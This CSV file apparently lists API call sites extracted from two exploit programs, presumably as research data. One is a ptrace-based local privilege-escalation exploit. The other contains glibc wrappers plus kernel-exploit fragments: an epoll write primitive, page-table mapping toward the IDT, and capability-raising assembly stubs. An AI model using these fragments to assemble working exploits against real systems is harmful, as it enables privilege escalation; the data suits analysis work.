EID,func,API use case
12,main,setsid ();
12,main,umask (18);
12,main,"unlink ((const char *) ""/tmp/w00w00w"");"
12,main,"open ((const char *) ""/tmp/w00w00w"", 578, 493);"
12,main,"fdopen (fd, (const char *) ""w+"");"
12,main,"fprintf (fp, (const char * restrict) ""%s\n"", shellcmd);"
12,main,fclose (fp);
12,main,"snprintf ((char *) &buf, 4095, (const char * restrict) ""/proc/%d/status"", pid);"
12,main,"signal (10, sighnd);"
12,main,fork ())
12,main,"open ((const char *) ""/dev/zero"", 2);"
12,main,"mmap (0B, 4096, 3, 2, fd, 0);"
12,main,"kill (getppid (), 10);"
12,main,"open ((const char *) ""/dev/dsp3"", 2048);"
12,main,"kill (p, 10);"
12,main,"open ((const char *) &buf, 0);"
12,main,"fdopen (fd, (const char *) ""r""))"
12,main,"get_ids (fp, &uids) != 4 || ((uids.uid != uids.euid || uids.uid != uids.suid) || uids.uid != uids.fsuid)"
12,main,"ptrace (16, pid, 0B, 0B)"
12,main,"ptrace (24, pid, 0B, 0B);"
12,main,"ptrace (12, pid, 0, &regs) != 0 || regs.rip == 0) || regs.rip > 3221225471)"
12,main,"waitpid (pid, 0B, 2);"
12,main,exploit (pid);
12,main,fclose (fp);
1397,atoi,"return (int) strtol (__nptr, 0B, 10);"
1397,atol,"strtol (__nptr, 0B, 10);"
1397,atoll,"strtoll (__nptr, 0B, 10);"
1397,bsearch,"__compar (__key, __p);"
1397,atof,"strtod (__nptr, 0B);"
1397,realpath,"__builtin_object_size ((const void *) __resolved, 1)"
1397,realpath,"__realpath_chk (__name, __resolved, __builtin_object_size ((const void *) __resolved, 1));"
1397,realpath,"__realpath_alias (__name, __resolved);"
1397,ptsname_r,"__builtin_object_size ((const void *) __buf, 1)"
1397,ptsname_r,__builtin_constant_p (__buflen)
1397,ptsname_r,"__ptsname_r_chk (__fd, __buf, __buflen, __builtin_object_size ((const void *) __buf, 1));"
1397,ptsname_r,"__builtin_object_size ((const void *) __buf, 1)"
1397,ptsname_r,"__ptsname_r_chk_warn (__fd, __buf, __buflen, __builtin_object_size ((const void *) __buf, 1));"
1397,ptsname_r,"__ptsname_r_alias (__fd, __buf, __buflen);"
1397,wctomb,"__builtin_object_size ((const void *) __s, 1) != 4294967295 && __builtin_object_size ((const void *) __s, 1)"
1397,wctomb,"__wctomb_chk (__s, __wchar, __builtin_object_size ((const void *) __s, 1));"
1397,wctomb,"__wctomb_alias (__s, __wchar);"
1397,mbstowcs,"__builtin_object_size ((const void *) __dst, 1)"
1397,mbstowcs,__builtin_constant_p (__len)
1397,mbstowcs,"__mbstowcs_chk (__dst, __src, __len, __builtin_object_size ((const void *) __dst, 1) / 4);"
1397,mbstowcs,"__builtin_object_size ((const void *) __dst, 1) / 4)"
1397,mbstowcs,"__mbstowcs_chk_warn (__dst, __src, __len, __builtin_object_size ((const void *) __dst, 1) / 4);"
1397,mbstowcs,"__mbstowcs_alias (__dst, __src, __len);"
1397,wcstombs,"__builtin_object_size ((const void *) __dst, 1)"
1397,wcstombs,__builtin_constant_p (__len)
1397,wcstombs,"__wcstombs_chk (__dst, __src, __len, __builtin_object_size ((const void *) __dst, 1));"
1397,wcstombs,"__builtin_object_size ((const void *) __dst, 1)"
1397,wcstombs,"__wcstombs_chk_warn (__dst, __src, __len, __builtin_object_size ((const void *) __dst, 1));"
1397,wcstombs,"__wcstombs_alias (__dst, __src, __len);"
1397,getchar,getc (stdin);
1397,putchar,"putc (__c, stdout);"
1397,fputc_unlocked,"__builtin_expect (__stream->_IO_write_ptr >= __stream->_IO_write_end, 0) != 0 ? __overflow (__stream, (int) (unsigned char) __c) : (int) (unsigned char) (*__stream->_IO_write_ptr++  = (char) __c);"
1397,putc_unlocked,"__builtin_expect (__stream->_IO_write_ptr >= __stream->_IO_write_end, 0) != 0 ? __overflow (__stream, (int) (unsigned char) __c) : (int) (unsigned char) (*__stream->_IO_write_ptr++  = (char) __c);"
1397,putchar_unlocked,"__builtin_expect (stdout->_IO_write_ptr >= stdout->_IO_write_end, 0) != 0 ? __overflow (stdout, (int) (unsigned char) __c) : (int) (unsigned char) (*stdout->_IO_write_ptr++  = (char) __c);"
1397,getline,"__getdelim (__lineptr, __n, 10, __stream);"
1397,sprintf,"__builtin___sprintf_chk (__s, 1, __builtin_object_size ((const void *) __s, 1), __fmt, __builtin_va_arg_pack ());"
1397,vsprintf,"__builtin___vsprintf_chk (__s, 1, __builtin_object_size ((const void *) __s, 1), __fmt, __ap);"
1397,snprintf,"__builtin___snprintf_chk (__s, __n, 1, __builtin_object_size ((const void *) __s, 1), __fmt, __builtin_va_arg_pack ());"
1397,vsnprintf,"__builtin___vsnprintf_chk (__s, __n, 1, __builtin_object_size ((const void *) __s, 1), __fmt, __ap);"
1397,fprintf,"__fprintf_chk (__stream, 1, __fmt, __builtin_va_arg_pack ());"
1397,printf,"__printf_chk (1, __fmt, __builtin_va_arg_pack ());"
1397,vprintf,"__vfprintf_chk (stdout, 1, __fmt, __ap);"
1397,vfprintf,"__vfprintf_chk (__stream, 1, __fmt, __ap);"
1397,dprintf,"__dprintf_chk (__fd, 1, __fmt, __builtin_va_arg_pack ());"
1397,vdprintf,"__vdprintf_chk (__fd, 1, __fmt, __ap);"
1397,asprintf,"__asprintf_chk (__ptr, 1, __fmt, __builtin_va_arg_pack ());"
1397,__asprintf,"__asprintf_chk (__ptr, 1, __fmt, __builtin_va_arg_pack ());"
1397,obstack_printf,"__obstack_printf_chk (__obstack, 1, __fmt, __builtin_va_arg_pack ());"
1397,vasprintf,"__vasprintf_chk (__ptr, 1, __fmt, __ap);"
1397,obstack_vprintf,"__obstack_vprintf_chk (__obstack, 1, __fmt, __ap);"
1397,fgets,"__builtin_object_size ((const void *) __s, 1)"
1397,fgets,__builtin_constant_p (__n)
1397,fgets,"__fgets_chk (__s, __builtin_object_size ((const void *) __s, 1), __n, __stream);"
1397,fgets,"__builtin_object_size ((const void *) __s, 1) < (unsigned int)"
1397,fgets,"__fgets_chk_warn (__s, __builtin_object_size ((const void *) __s, 1), __n, __stream);"
1397,fgets,"__fgets_alias (__s, __n, __stream);"
1397,fread,"__builtin_object_size ((const void *) __ptr, 0)"
1397,fread,__builtin_constant_p (__size) == 0 || __builtin_constant_p (__n) == 0) || (__size | __n)
1397,fread,"__fread_chk (__ptr, __builtin_object_size ((const void *) __ptr, 0), __size, __n, __stream);"
1397,fread,"__builtin_object_size ((const void *) __ptr, 0)"
1397,fread,"__fread_chk_warn (__ptr, __builtin_object_size ((const void *) __ptr, 0), __size, __n, __stream);"
1397,fread,"__fread_alias (__ptr, __size, __n, __stream);"
1397,fgets_unlocked,"__builtin_object_size ((const void *) __s, 1)"
1397,fgets_unlocked,__builtin_constant_p (__n)
1397,fgets_unlocked,"__fgets_unlocked_chk (__s, __builtin_object_size ((const void *) __s, 1), __n, __stream);"
1397,fgets_unlocked,"__builtin_object_size ((const void *) __s, 1) < (unsigned int)"
1397,fgets_unlocked,"__fgets_unlocked_chk_warn (__s, __builtin_object_size ((const void *) __s, 1), __n, __stream);"
1397,fgets_unlocked,"__fgets_unlocked_alias (__s, __n, __stream);"
1397,fread_unlocked,"__builtin_object_size ((const void *) __ptr, 0)"
1397,fread_unlocked,__builtin_constant_p (__size) == 0 || __builtin_constant_p (__n) == 0) || (__size | __n)
1397,fread_unlocked,"__fread_unlocked_chk (__ptr, __builtin_object_size ((const void *) __ptr, 0), __size, __n, __stream);"
1397,fread_unlocked,"__builtin_object_size ((const void *) __ptr, 0)"
1397,fread_unlocked,"__fread_unlocked_chk_warn (__ptr, __builtin_object_size ((const void *) __ptr, 0), __size, __n, __stream);"
1397,fread_unlocked,__builtin_constant_p (__size) != 0 && __builtin_constant_p (__n) != 0) && (__size | __n) <= 65535)
1397,fread_unlocked,getc_unlocked (__stream);
1397,fread_unlocked,getc_unlocked (__stream);
1397,fread_unlocked,"__fread_unlocked_alias (__ptr, __size, __n, __stream);"
1397,recv,"__builtin_object_size ((const void *) __buf, 0)"
1397,recv,__builtin_constant_p (__n)
1397,recv,"__recv_chk (__fd, __buf, __n, __builtin_object_size ((const void *) __buf, 0), __flags);"
1397,recv,"__builtin_object_size ((const void *) __buf, 0)"
1397,recv,"__recv_chk_warn (__fd, __buf, __n, __builtin_object_size ((const void *) __buf, 0), __flags);"
1397,recv,"__recv_alias (__fd, __buf, __n, __flags);"
1397,recvfrom,"__builtin_object_size ((const void *) __buf, 0)"
1397,recvfrom,__builtin_constant_p (__n)
1397,recvfrom,"__recvfrom_chk (__fd, __buf, __n, __builtin_object_size ((const void *) __buf, 0), __flags, __addr, __addr_len);"
1397,recvfrom,"__builtin_object_size ((const void *) __buf, 0)"
1397,recvfrom,"__recvfrom_chk_warn (__fd, __buf, __n, __builtin_object_size ((const void *) __buf, 0), __flags, __addr, __addr_len);"
1397,recvfrom,"__recvfrom_alias (__fd, __buf, __n, __flags, __addr, __addr_len);"
1397,read,"__builtin_object_size ((const void *) __buf, 0)"
1397,read,__builtin_constant_p (__nbytes)
1397,read,"__read_chk (__fd, __buf, __nbytes, __builtin_object_size ((const void *) __buf, 0));"
1397,read,"__builtin_object_size ((const void *) __buf, 0)"
1397,read,"__read_chk_warn (__fd, __buf, __nbytes, __builtin_object_size ((const void *) __buf, 0));"
1397,read,"__read_alias (__fd, __buf, __nbytes);"
1397,pread,"__builtin_object_size ((const void *) __buf, 0)"
1397,pread,__builtin_constant_p (__nbytes)
1397,pread,"__pread_chk (__fd, __buf, __nbytes, __offset, __builtin_object_size ((const void *) __buf, 0));"
1397,pread,"__builtin_object_size ((const void *) __buf, 0)"
1397,pread,"__pread_chk_warn (__fd, __buf, __nbytes, __offset, __builtin_object_size ((const void *) __buf, 0));"
1397,pread,"__pread_alias (__fd, __buf, __nbytes, __offset);"
1397,pread64,"__builtin_object_size ((const void *) __buf, 0)"
1397,pread64,__builtin_constant_p (__nbytes)
1397,pread64,"__pread64_chk (__fd, __buf, __nbytes, __offset, __builtin_object_size ((const void *) __buf, 0));"
1397,pread64,"__builtin_object_size ((const void *) __buf, 0)"
1397,pread64,"__pread64_chk_warn (__fd, __buf, __nbytes, __offset, __builtin_object_size ((const void *) __buf, 0));"
1397,pread64,"__pread64_alias (__fd, __buf, __nbytes, __offset);"
1397,readlink,"__builtin_object_size ((const void *) __buf, 1)"
1397,readlink,__builtin_constant_p (__len)
1397,readlink,"__readlink_chk (__path, __buf, __len, __builtin_object_size ((const void *) __buf, 1));"
1397,readlink,"__builtin_object_size ((const void *) __buf, 1)"
1397,readlink,"__readlink_chk_warn (__path, __buf, __len, __builtin_object_size ((const void *) __buf, 1));"
1397,readlink,"__readlink_alias (__path, __buf, __len);"
1397,readlinkat,"__builtin_object_size ((const void *) __buf, 1)"
1397,readlinkat,__builtin_constant_p (__len)
1397,readlinkat,"__readlinkat_chk (__fd, __path, __buf, __len, __builtin_object_size ((const void *) __buf, 1));"
1397,readlinkat,"__builtin_object_size ((const void *) __buf, 1)"
1397,readlinkat,"__readlinkat_chk_warn (__fd, __path, __buf, __len, __builtin_object_size ((const void *) __buf, 1));"
1397,readlinkat,"__readlinkat_alias (__fd, __path, __buf, __len);"
1397,getcwd,"__builtin_object_size ((const void *) __buf, 1)"
1397,getcwd,__builtin_constant_p (__size)
1397,getcwd,"__getcwd_chk (__buf, __size, __builtin_object_size ((const void *) __buf, 1));"
1397,getcwd,"__builtin_object_size ((const void *) __buf, 1)"
1397,getcwd,"__getcwd_chk_warn (__buf, __size, __builtin_object_size ((const void *) __buf, 1));"
1397,getcwd,"__getcwd_alias (__buf, __size);"
1397,getwd,"__builtin_object_size ((const void *) __buf, 1)"
1397,getwd,"__getwd_chk (__buf, __builtin_object_size ((const void *) __buf, 1));"
1397,getwd,__getwd_warn (__buf);
1397,confstr,"__builtin_object_size ((const void *) __buf, 1)"
1397,confstr,__builtin_constant_p (__len)
1397,confstr,"__confstr_chk (__name, __buf, __len, __builtin_object_size ((const void *) __buf, 1));"
1397,confstr,"__builtin_object_size ((const void *) __buf, 1) < (unsigned int)"
1397,confstr,"__confstr_chk_warn (__name, __buf, __len, __builtin_object_size ((const void *) __buf, 1));"
1397,confstr,"__confstr_alias (__name, __buf, __len);"
1397,getgroups,"__builtin_object_size ((const void *) __list, 1)"
1397,getgroups,__builtin_constant_p (__size)
1397,getgroups,"__getgroups_chk (__size, __list, __builtin_object_size ((const void *) __list, 1));"
1397,getgroups,"__builtin_object_size ((const void *) __list, 1)"
1397,getgroups,"__getgroups_chk_warn (__size, __list, __builtin_object_size ((const void *) __list, 1));"
1397,getgroups,"__getgroups_alias (__size, __list);"
1397,ttyname_r,"__builtin_object_size ((const void *) __buf, 1)"
1397,ttyname_r,__builtin_constant_p (__buflen)
1397,ttyname_r,"__ttyname_r_chk (__fd, __buf, __buflen, __builtin_object_size ((const void *) __buf, 1));"
1397,ttyname_r,"__builtin_object_size ((const void *) __buf, 1)"
1397,ttyname_r,"__ttyname_r_chk_warn (__fd, __buf, __buflen, __builtin_object_size ((const void *) __buf, 1));"
1397,ttyname_r,"__ttyname_r_alias (__fd, __buf, __buflen);"
1397,getlogin_r,"__builtin_object_size ((const void *) __buf, 1)"
1397,getlogin_r,__builtin_constant_p (__buflen)
1397,getlogin_r,"__getlogin_r_chk (__buf, __buflen, __builtin_object_size ((const void *) __buf, 1));"
1397,getlogin_r,"__builtin_object_size ((const void *) __buf, 1)"
1397,getlogin_r,"__getlogin_r_chk_warn (__buf, __buflen, __builtin_object_size ((const void *) __buf, 1));"
1397,getlogin_r,"__getlogin_r_alias (__buf, __buflen);"
1397,gethostname,"__builtin_object_size ((const void *) __buf, 1)"
1397,gethostname,__builtin_constant_p (__buflen)
1397,gethostname,"__gethostname_chk (__buf, __buflen, __builtin_object_size ((const void *) __buf, 1));"
1397,gethostname,"__builtin_object_size ((const void *) __buf, 1)"
1397,gethostname,"__gethostname_chk_warn (__buf, __buflen, __builtin_object_size ((const void *) __buf, 1));"
1397,gethostname,"__gethostname_alias (__buf, __buflen);"
1397,getdomainname,"__builtin_object_size ((const void *) __buf, 1)"
1397,getdomainname,__builtin_constant_p (__buflen)
1397,getdomainname,"__getdomainname_chk (__buf, __buflen, __builtin_object_size ((const void *) __buf, 1));"
1397,getdomainname,"__builtin_object_size ((const void *) __buf, 1)"
1397,getdomainname,"__getdomainname_chk_warn (__buf, __buflen, __builtin_object_size ((const void *) __buf, 1));"
1397,getdomainname,"__getdomainname_alias (__buf, __buflen);"
1397,bcopy,"__builtin___memmove_chk (__dest, __src, __len, __builtin_object_size ((const void *) __dest, 0));"
1397,bzero,"__builtin___memset_chk (__dest, 0, __len, __builtin_object_size ((const void *) __dest, 0));"
1397,memcpy,"__builtin___memcpy_chk (__dest, __src, __len, __builtin_object_size ((const void *) __dest, 0));"
1397,memmove,"__builtin___memmove_chk (__dest, __src, __len, __builtin_object_size ((const void *) __dest, 0));"
1397,mempcpy,"__builtin___mempcpy_chk (__dest, __src, __len, __builtin_object_size ((const void *) __dest, 0));"
1397,memset,"__builtin___memset_chk (__dest, __ch, __len, __builtin_object_size ((const void *) __dest, 0));"
1397,explicit_bzero,"__explicit_bzero_chk (__dest, __len, __builtin_object_size ((const void *) __dest, 0));"
1397,strcpy,"__builtin___strcpy_chk (__dest, __src, __builtin_object_size ((const void *) __dest, 1));"
1397,stpcpy,"__builtin___stpcpy_chk (__dest, __src, __builtin_object_size ((const void *) __dest, 1));"
1397,strncpy,"__builtin___strncpy_chk (__dest, __src, __len, __builtin_object_size ((const void *) __dest, 1));"
1397,stpncpy,"__builtin_object_size ((const void *) __dest, 1) != 4294967295 && (__builtin_constant_p (__n) == 0 || (size_t) __builtin_object_size ((const void *) __dest, 1) < __n)"
1397,stpncpy,"__stpncpy_chk (__dest, __src, __n, __builtin_object_size ((const void *) __dest, 1));"
1397,stpncpy,"__stpncpy_alias (__dest, __src, __n);"
1397,strcat,"__builtin___strcat_chk (__dest, __src, __builtin_object_size ((const void *) __dest, 1));"
1397,strncat,"__builtin___strncat_chk (__dest, __src, __len, __builtin_object_size ((const void *) __dest, 1));"
1397,__kcode,"pushl (%eax) \n call kernel \n addl $4, %esp \n popl %ds \n popl %es \n popa \n cli \n iret \n""::);"
1397,raise_cap,"capget ((void *) &head, (void *) &data);"
1397,raise_cap,"capget ((void *) &head, (void *) &n);"
1397,__stub,"pushl (%eax); call raise_cap; pop %eax; popa; iret;""::);"
1397,kwrite,epoll_create (4096);
1397,kwrite,__builtin_alloca ((unsigned int) ((count + 255) / 256) * 4);
1397,kwrite,"socketpair (1, 2, 0, (int *) &pi)"
1397,kwrite,"send (pi[0], (const void *) ""a"", 1, 0);"
1397,kwrite,"epoll_ctl (efd, 1, fd, &ev);"
1397,kwrite,"dup2 (*(stab + (sizetype) ((unsigned int) (i / 256) * 4)), (fd + 2) + i % 256);"
1397,kwrite,"epoll_ctl (efd, 1, n, &ev);"
1397,kwrite,close (n);
1397,kwrite,"epoll_wait (efd, (struct epoll_event *) ptr, (int) magic, 31337);"
1397,kwrite,"memcpy ((void * restrict) &ev.data, (const void * restrict) (buf + (((sizetype) num - (sizetype) (i * 8)) + 4294967288)), 8);"
1397,kwrite,"epoll_ctl (efd, 3, fd, &ev);"
1397,kwrite,"epoll_wait (efd, (struct epoll_event *) ptr, (int) magic, 31337);"
1397,kwrite,"epoll_wait (efd, (struct epoll_event *) ptr, (int) magic, 31337);"
1397,kwrite,close (efd);
1397,kwrite,close (i);
1397,map_pte,__builtin_alloca ((unsigned int) (pagenr * 4096 + 8));
1397,map_pte,__builtin_alloca ((unsigned int) (pagenr * 4096 + 8));
1397,map_pte,fixint ((char *) buf);
1397,map_pte,"kwrite (base, (char *) buf, pagenr * 4096 + 4);"
1397,map_pme,__builtin_alloca ((unsigned int) (pagenr * 4096 + 32));
1397,map_pme,__builtin_alloca ((unsigned int) (pagenr * 4096 + 32));
1397,map_pme,fixint ((char *) buf);
1397,map_pme,"kwrite (base, (char *) buf, pagenr * 4096 + 12);"
1397,error,"printf ((const char * restrict) ""\x1b[1;30m[\x1b[1;37m-\x1b[1;30m]\x1b[0m y3r 422 12 n07 3r337 3nuPh!\n\x1b[1;30m[\x1b[1;37m*\x1b[1;30m]\x1b[0m Try increase nrpages?\n"");"
1397,error,exit (1);
1397,exploit,"signal (11, error);"
1397,exploit,"signal (7, error);"
1397,exploit,"map_pte (kernelbase, npages, idtr.base - kernelbase);"
1397,exploit,"map_pme (kernelbase, npages, idtr.base - kernelbase);"
